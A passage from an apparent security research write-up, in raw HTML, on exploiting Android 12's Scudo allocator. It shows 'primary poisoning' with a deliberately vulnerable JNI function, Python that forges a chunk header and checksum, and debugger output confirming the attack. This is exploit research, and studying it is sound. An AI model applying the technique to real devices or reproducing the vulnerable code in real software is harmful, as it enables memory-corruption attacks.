</span></span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>Options</span><span class=p>.</span><span class=n>get</span><span class=p>(</span><span class=n>OptionBit</span><span class=o>::</span><span class=n>DeallocTypeMismatch</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>UNLIKELY</span><span class=p>(</span><span class=n>Header</span><span class=p>.</span><span class=n>OriginOrWasZeroed</span> <span class=o>!=</span> <span class=n>Origin</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>Header</span><span class=p>.</span><span class=n>OriginOrWasZeroed</span> <span class=o>!=</span> <span class=n>Chunk</span><span class=o>::</span><span class=n>Origin</span><span class=o>::</span><span class=n>Memalign</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>              <span class=n>Origin</span> <span class=o>!=</span> <span class=n>Chunk</span><span class=o>::</span><span class=n>Origin</span><span class=o>::</span><span class=n>Malloc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>reportDeallocTypeMismatch</span><span class=p>(</span><span class=n>AllocatorAction</span><span class=o>::</span><span class=n>Deallocating</span><span class=p>,</span> <span class=n>Ptr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                      <span class=n>Header</span><span class=p>.</span><span class=n>OriginOrWasZeroed</span><span class=p>,</span> <span class=n>Origin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=c1>// [5] Check the size of the chunk
</span></span></span><span class=line><span class=cl><span class=k>const</span> <span class=n>uptr</span> <span class=n>Size</span> <span class=o>=</span> <span class=n>getSize</span><span class=p>(</span><span class=n>Ptr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Header</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>DeleteSize</span> <span class=o>&amp;&amp;</span> <span class=n>Options</span><span class=p>.</span><span class=n>get</span><span class=p>(</span><span class=n>OptionBit</span><span class=o>::</span><span class=n>DeleteSizeMismatch</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>UNLIKELY</span><span class=p>(</span><span class=n>DeleteSize</span> <span class=o>!=</span> <span class=n>Size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>reportDeleteSizeMismatch</span><span class=p>(</span><span class=n>Ptr</span><span class=p>,</span> <span class=n>DeleteSize</span><span class=p>,</span> <span class=n>Size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// [6] This does the actual freeing
</span></span></span><span class=line><span class=cl><span class=n>quarantineOrDeallocateChunk</span><span class=p>(</span><span class=n>Options</span><span class=p>,</span> <span class=n>TaggedPtr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Header</span><span class=p>,</span> <span class=n>Size</span><span class=p>);</span>
</span></span></code></pre></div><p>From the <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=36" target=_blank rel=noopener>call to <code>deallocate</code> in <code>scudo_malloc</code></a>
and the <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=513;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1" target=_blank rel=noopener>function signature of <code>deallocate</code></a>
, we can infer that <em>[5]</em> is not relevant:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=n>INTERFACE</span> <span class=n>WEAK</span> <span class=kt>void</span> <span class=nf>SCUDO_PREFIX</span><span class=p>(</span><span class=n>free</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=n>ptr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>SCUDO_ALLOCATOR</span><span class=p>.</span><span class=n>deallocate</span><span class=p>(</span><span class=n>ptr</span><span class=p>,</span> <span class=n>scudo</span><span class=o>::</span><span class=n>Chunk</span><span class=o>::</span><span class=n>Origin</span><span class=o>::</span><span class=n>Malloc</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NOINLINE</span> <span class=kt>void</span> <span class=nf>deallocate</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>Ptr</span><span class=p>,</span> <span class=n>Chunk</span><span class=o>::</span><span class=n>Origin</span> <span class=n>Origin</span><span class=p>,</span> <span class=n>uptr</span> <span class=n>DeleteSize</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                          <span class=n>UNUSED</span> <span class=n>uptr</span> <span class=n>Alignment</span> <span class=o>=</span> <span class=n>MinAlignment</span><span class=p>)</span> <span class=p>{...}</span>
</span></span></code></pre></div><p>as <code>DeleteSize</code> defaults to <code>0</code>! Therefore, as long as <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=1078" target=_blank rel=noopener><code>quarantineOrDeallocateChunk</code></a>
does not apply any more checks on the size, the size can be choosen arbitrarily, i.e. to our advantage.</p><p>In <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=1078" target=_blank rel=noopener><code>quarantineOrDeallocateChunk</code></a>
, there is a check that determines whether a chunk will be put into quarantine, i.e. its freeing will be hold back to avoid reuse - based attacks. The flag that represents this <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1085;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1" target=_blank rel=noopener>check</a>
is computed as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=c1>// If the quarantine is disabled, the actual size of a chunk is 0 or larger
</span></span></span><span class=line><span class=cl><span class=c1>// than the maximum allowed, we return a chunk directly to the backend.
</span></span></span><span class=line><span class=cl><span class=c1>// This purposefully underflows for Size == 0.
</span></span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>bool</span> <span class=n>BypassQuarantine</span> <span class=o>=</span> <span class=o>!</span><span class=n>Quarantine</span><span class=p>.</span><span class=n>getCacheSize</span><span class=p>()</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>                              <span class=p>((</span><span class=n>Size</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=n>QuarantineMaxChunkSize</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>                              <span class=o>!</span><span class=n>NewHeader</span><span class=p>.</span><span class=n>ClassId</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>Notice that the comment states that &ldquo;This purposefully underflows for Size == 0&rdquo;, making <code>BypassQuarantine = true</code> for <code>Size = 0</code> :) Therefore, even if the quarantine was activated by default (which it is not! Notice that <code>Quarantine.getCacheSize() = thread_local_quarantine_size_kb &lt;&lt; 10</code>, where <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/flags.inc;l=18;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1" target=_blank rel=noopener><code>thread_local_quarantine_size_kb = 0</code></a>
), we could bypass the quarantine by <code>size = 0</code>.</p><p>There are a few more interesting checks for the chunk (in the bypass branch):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=n>BlockBegin</span> <span class=o>=</span> <span class=n>getBlockBegin</span><span class=p>(</span><span class=n>Ptr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>NewHeader</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>const</span> <span class=n>uptr</span> <span class=n>ClassId</span> <span class=o>=</span> <span class=n>NewHeader</span><span class=p>.</span><span class=n>ClassId</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>LIKELY</span><span class=p>(</span><span class=n>ClassId</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>TSD</span><span class=o>-&gt;</span><span class=n>Cache</span><span class=p>.</span><span class=n>deallocate</span><span class=p>(</span><span class=n>ClassId</span><span class=p>,</span> <span class=n>BlockBegin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>Secondary</span><span class=p>.</span><span class=n>deallocate</span><span class=p>(</span><span class=n>Options</span><span class=p>,</span> <span class=n>BlockBegin</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span> <span class=o>*</span><span class=n>getBlockBegin</span><span class=p>(</span><span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=n>Ptr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                  <span class=n>Chunk</span><span class=o>::</span><span class=n>UnpackedHeader</span> <span class=o>*</span><span class=n>Header</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=k>reinterpret_cast</span><span class=o>&lt;</span><span class=kt>void</span> <span class=o>*&gt;</span><span class=p>(</span>
</span></span><span class=line><span class=cl>      <span class=k>reinterpret_cast</span><span class=o>&lt;</span><span class=n>uptr</span><span class=o>&gt;</span><span class=p>(</span><span class=n>Ptr</span><span class=p>)</span> <span class=o>-</span> <span class=n>Chunk</span><span class=o>::</span><span class=n>getHeaderSize</span><span class=p>()</span> <span class=o>-</span>
</span></span><span class=line><span class=cl>      <span class=p>(</span><span class=k>static_cast</span><span class=o>&lt;</span><span class=n>uptr</span><span class=o>&gt;</span><span class=p>(</span><span class=n>Header</span><span class=o>-&gt;</span><span class=n>Offset</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=n>MinAlignmentLog</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Observe that we control <code>NewHeader.ClassId</code> and <code>Header->Offset</code> (maybe <code>Header->Offset</code> can be used for <a href=#future-work>memory probing</a>
).</p><p>From this point onwards, we can distinguish attacks that use the primary or the secondary!</p><h4 id=primary-poisoning>Primary Poisoning</h4><p>If we want to get to <code>Cache.deallocate</code>, we will need <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1118;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>NewHeader.ClassId > 0</code></a>
to pass the check.</p><p>Investigating <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=84" target=_blank rel=noopener><code>Cache.deallocate</code></a>
, which is the primary, reveals:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>void</span> <span class=nf>deallocate</span><span class=p>(</span><span class=n>uptr</span> <span class=n>ClassId</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>P</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>CHECK_LT</span><span class=p>(</span><span class=n>ClassId</span><span class=p>,</span> <span class=n>NumClasses</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>PerClass</span> <span class=o>*</span><span class=n>C</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>PerClassArray</span><span class=p>[</span><span class=n>ClassId</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=n>C</span><span class=o>-&gt;</span><span class=n>Chunks</span><span class=p>[</span><span class=n>C</span><span class=o>-&gt;</span><span class=n>Count</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span>
</span></span><span class=line><span class=cl>      <span class=n>Allocator</span><span class=o>-&gt;</span><span class=n>compactPtr</span><span class=p>(</span><span class=n>ClassId</span><span class=p>,</span> <span class=k>reinterpret_cast</span><span class=o>&lt;</span><span class=n>uptr</span><span class=o>&gt;</span><span class=p>(</span><span class=n>P</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Thus, if we get through all the checks, when <code>Cache.deallocate</code> is called, our fake chunk will be part of the list! One way to verify this is to create a JNI function of the form:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#define BUFFER_SIZE 0x20
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>uint8_t</span> <span class=n>called</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>buffer</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>JNIEXPORT</span> <span class=n>jbyteArray</span> <span class=n>JNICALL</span> <span class=nf>Java_com_damnvulnerableapp_vulnerable_modules_PoCPrimaryPoisoning_free</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>JNIEnv</span> <span class=o>*</span><span class=n>env</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>jobject</span> <span class=n>class</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>jbyteArray</span> <span class=n>chunk</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Leaks the pointer of a global buffer on first call.
</span></span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>called</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>called</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>buffer</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>BUFFER_SIZE</span><span class=p>);</span>   <span class=c1>// enough memory to store full classid 1 chunk
</span></span></span><span class=line><span class=cl>        <span class=n>jbyteArray</span> <span class=n>ar</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=nf>NewByteArray</span><span class=p>(</span><span class=n>env</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>jbyte</span> <span class=o>*</span><span class=n>leak</span> <span class=o>=</span> <span class=p>(</span><span class=n>jbyte</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=nf>SetByteArrayRegion</span><span class=p>(</span><span class=n>env</span><span class=p>,</span> <span class=n>ar</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=n>leak</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>ar</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Calls free(buffer + 0x10) and tries to avoid heap meta data overflows
</span></span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>raw</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=nf>GetByteArrayElements</span><span class=p>(</span><span class=n>env</span><span class=p>,</span> <span class=n>chunk</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>length</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=nf>GetArrayLength</span><span class=p>(</span><span class=n>env</span><span class=p>,</span> <span class=n>chunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>raw</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>memcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>raw</span><span class=p>,</span> <span class=p>(</span><span class=n>length</span> <span class=o>&lt;=</span> <span class=n>BUFFER_SIZE</span><span class=p>)</span> <span class=o>?</span> <span class=nl>length</span> <span class=p>:</span> <span class=n>BUFFER_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Brings attacker - controlled chunk into primary
</span></span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>buffer</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>);</span> <span class=c1>// combined header
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>new</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>jbyteArray</span> <span class=n>output</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=nf>NewByteArray</span><span class=p>(</span><span class=n>env</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=nf>SetByteArrayRegion</span><span class=p>(</span><span class=n>env</span><span class=p>,</span> <span class=n>output</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=n>new</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>output</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Then, an attacker could write the header first, then 8 bytes of padding, followed by e.g. a string &ldquo;Hello World!&rdquo;. Lets see that in action!</p><p>Lets say the first call to this function leaked <code>pointer = 0x7bac7976f730</code> and say we somehow got <strong>a</strong> cookie from a previous leak or so, <code>Cookie = 0x2a7e</code>. Then we could use the following code to craft the fake header:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>combined_header</span> <span class=o>=</span> <span class=n>unpacked_header</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span><span class=o>.</span><span class=n>ClassId</span> <span class=o>=</span> <span class=mi>1</span> <span class=c1># Smallest allocation class --&gt; primary, user_data_size=0x10</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span><span class=o>.</span><span class=n>State</span> <span class=o>=</span> <span class=mi>1</span>   <span class=c1># = Allocated --&gt; cannot free a free chunk</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span><span class=o>.</span><span class=n>SizeOrUnusedBytes</span> <span class=o>=</span> <span class=mi>0</span>   <span class=c1># Bypass quarantine (actually irrelevant)</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span><span class=o>.</span><span class=n>OriginOrWasZeroed</span> <span class=o>=</span> <span class=mi>0</span>   <span class=c1># = allocated via malloc</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span><span class=o>.</span><span class=n>Offset</span> <span class=o>=</span> <span class=mi>0</span>  <span class=c1># chunk_start ~= usr_ptr - header_size - offset</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span><span class=o>.</span><span class=n>Checksum</span> <span class=o>=</span> <span class=n>utils</span><span class=o>.</span><span class=n>android_crc32</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>cookie</span><span class=p>,</span> <span class=c1># 0x2a7e</span>
</span></span><span class=line><span class=cl>    <span class=n>pointer</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>,</span> <span class=c1># buffer = 0x7bac7976f730 =&gt; buffer + 0x10 fake user data</span>
</span></span><span class=line><span class=cl>    <span class=n>combined_header</span><span class=o>.</span><span class=n>pack</span><span class=p>()</span>  <span class=c1># u64 representation of this header, with checksum=0</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span></code></pre></div><p>With the above, the header looks like <code>0x75a5000000000101</code> (mind little - endian).</p><p>If we send <code>combined_header.bytes() + p64(0) + b'Hello World!</code> and set a breakpoint right before the call to <code>free(buffer + 0x10)</code>, we get:</p><pre tabindex=0><code>...
gefâ¤  i r rdi
    rdi            0x7bac7976f740      0x7bac7976f740
gefâ¤  x/4gx $rdi-0x10
    0x7bac7976f730:	0x75a5000000000101	0x0000000000000000
    0x7bac7976f740:	0x6f57206f6c6c6548	0x0000000021646c72
...
</code></pre><p>Notice that the leaked pointer is <code>0x7bac7976f730</code>! So this looks promising! Stepping over <code>free</code> will either tell us that we messed up by aborting, or will work and thus our fake chunk is in the primary.</p><p>It seems to have worked! The next call is to <code>malloc(0x10)</code> (see that the actual chunk size will be <code>0x20</code>, if <code>malloc(0x10)</code> is called, because <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=337;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>header</a>
and <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=338;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>padding</a>
are also stored). As <code>combined_header.ClassId = 1</code>, the chunk that we freed is part of the chunk array that is used to serve <code>malloc(0x10)</code> calls! Executing <code>malloc(0x10)</code> yields:</p><pre tabindex=0><code>gefâ¤  i r edi
    edi            0x10                0x10
gefâ¤  ni
    ...
gefâ¤  i r rax
    rax            0x7bac7976f740      0x7bac7976f740
gefâ¤  x/s $rax
    0x7bac7976f740:	&#34;Hello World!&#34;
</code></pre><p>Remember that we called <code>free(buffer + 0x10) = free(0x7bac7976f730 + 0x10) = free(0x7bac7976f740)</code>!</p><p>Therefore, not only did we move a chunk of size <code>0x30</code> (includes header size <code>0x10</code>; remember that <code>buffer = malloc(BUFFER_SIZE = 0x20)</code>) to the chunk array that contains chunks of size only <code>0x20</code>. But we also served a &ldquo;preinitialized&rdquo; chunk. Notice that we basically performed two different things at the same time:</p><ol><li>Served an <em>arbitrary</em> chunk (we will soon see that this cannot be <em>that arbitrary</em>&mldr;)</li><li>Preinitialized data. This is actually unexpected, but a nice feature :) Basically, this allows us to infer that <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=329;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>Options.getFillContentsMode() = NoFill</code></a>
, which comes from <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=153;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1" target=_blank rel=noopener>setting the flags</a>
where <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/flags.inc;l=35;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>zero_contents = false</code></a>
and <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/flags.inc;l=37;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>pattern_fill_contents = false</code></a>
! This will result in a check that determines <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=471;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>what to do with the contents</a>
to evaluate to <code>false</code>.</li></ol><h5 id=pitfalls-and-challenges>Pitfalls and Challenges</h5><p>The above primary poisoning seems to work perfectly, but I have not told you what assumptions lie in the dark&mldr;</p><p>Lets try to come up with a list of assumptions and constraints (ignoring the base assumption of availability of sufficient leaks and &ldquo;classical&rdquo; ones like that chunk addresses have to be aligned).</p><h6 id=thievish-threads>Thievish Threads</h6><p>As multiple threads share the same allocator (even the same TSD, which contains a cache that represents the primary), another thread could snack our fake chunk just introduced into the primary. Therefore, <strong>primary poisoning is probabilistic</strong>!</p><p>Moreover the thread that runs the JNI function could be <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=356;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>assigned another TSD</a>
, because the old one is overloaded, i.e. there are lots of threads using the same TSD. Again, we would never see our chunk again.</p><p><a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/tsd_shared.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=161" target=_blank rel=noopener>It looks like every thread could be assigned every TSD after <em>sufficient execution time</em></a>
(further analysis is needed to fully prove this). This might be beneficial in some cases where we want to attack code that is running in another thread.</p><h6 id=multi---threaded-chunk-liberation>Multi - Threaded Chunk Liberation</h6><p>The chunk array might be <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=91;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>drained</a>
, because the amount of free chunks, represented by <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=90;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>C->Count</code></a>
, exceeds an upper bound. E.g. <code>C->MaxCount = 13</code> for class id 1, because we can distinguish the following cases for <code>C->Count</code>:</p><ol><li><a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=183;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>C->Count = C->MaxCount / 2</code></a>
. This stems from the fact that <code>deallocate</code> can create batches if the corresponding <code>Chunks</code> array is full. To be precise, this will trigger the execution of <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=182;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>drain</code></a>
, where <code>C->Count = C->MaxCount</code>. Therefore the minimum <code>Count = Min(C->MaxCount / 2, C->Count)</code> in <code>drain</code> will evaluate to <code>0 &lt; C->MaxCount / 2 &lt; C->MaxCount</code>. Finally, <code>C->Count -= Count &lt;=> C->Count = C->MaxCount - C->MaxCount / 2 = C->MaxCount / 2</code>. Notice that <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=133;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1" target=_blank rel=noopener><code>C->MaxCount = 2 * TransferBatch::getMaxCached(Size)</code></a>
. As can be seen in the next step, for <code>malloc(0x10)</code>, this will result in <code>C->MaxCount = 2 * 13 = 26 => C->Count = 26 / 2 = 13</code>.</li><li><a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=396;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>C->Count = MaxCount</code></a>
, i.e.:<div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=n>C</span><span class=o>-&gt;</span><span class=n>Count</span> <span class=o>=</span> <span class=n>MaxCount</span>
</span></span><span class=line><span class=cl>        <span class=o>=</span> <span class=n>TransferBatch</span><span class=o>::</span><span class=n>getMaxCached</span><span class=p>(</span><span class=n>Size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>=</span> <span class=n>Min</span><span class=p>(</span><span class=n>MaxNumCached</span><span class=p>,</span> <span class=n>SizeClassMap</span><span class=o>::</span><span class=n>getMaxCachedHint</span><span class=p>(</span><span class=n>Size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=o>=</span> <span class=n>Min</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=n>Max</span><span class=p>(</span><span class=mi>1U</span><span class=p>,</span> <span class=n>Min</span><span class=p>(</span><span class=n>Config</span><span class=o>::</span><span class=n>MaxNumCachedHint</span><span class=p>,</span> <span class=n>N</span><span class=p>)))</span>
